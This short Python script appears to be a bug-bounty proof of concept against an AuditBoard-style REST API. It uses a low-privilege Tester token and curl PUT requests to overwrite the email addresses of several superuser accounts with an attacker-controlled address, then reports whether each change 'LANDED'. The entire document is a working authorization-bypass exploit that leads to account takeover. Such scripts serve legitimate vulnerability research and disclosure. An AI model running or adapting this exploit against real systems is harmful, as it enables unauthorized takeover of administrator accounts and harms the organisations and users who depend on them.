import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
TT=open('/tmp/tok_Tester').read().strip()
ATTACKER="zeno0@bugcrowdninja.com"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TT),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def user(uid,tok=None):
    c,b=req('GET',f'/api/v1/users/{uid}',tok=tok)
    try: return json.loads(b)['users'][0]
    except: return {}
print("=== Tester(role 4) vs SUPERUSER (role 1) targets: email write ===")
print(f"{'id':>4} {'email':38} {'auth_type':12} {'PUT':>5}  result")
for uid in [1,186,188,190,196,314]:
    u=user(uid)
    if not u: print(f"{uid:>4} unreadable"); continue
    before=u.get('email')
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"email":ATTACKER}},tok=TT)
    after=user(uid).get('email')
    landed = after!=before
    print(f"{uid:>4} {str(before)[:36]:38} {str(u.get('auth_type')):12} {c:>5}  {'*** LANDED -> '+str(after)+' ***' if landed else 'no change'}")
